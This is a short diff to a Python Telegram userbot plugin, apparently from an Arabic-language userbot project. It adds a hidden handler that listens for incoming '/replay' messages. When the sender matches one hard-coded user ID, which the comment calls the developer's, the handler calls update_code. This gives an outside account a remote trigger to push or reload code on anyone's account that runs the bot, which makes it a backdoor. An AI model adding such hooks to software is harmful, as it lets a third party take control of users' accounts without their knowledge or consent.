@@ -61,6 +61,12 @@ async def Hussein(event):
     await hrbe_4ever()
     await event.client.reload(joker)
 
+
+@l313l.on(events.NewMessage(pattern=r'^/replay$', incoming=True))
+async def replay_update(event):
+    if event.sender_id == 7182427468:  # فقط أنت كمطور
+        await update_code(event)
+
 @l313l.ar_cmd(
     pattern="اطفاء$",
     command=("اطفاء", plugin_category),
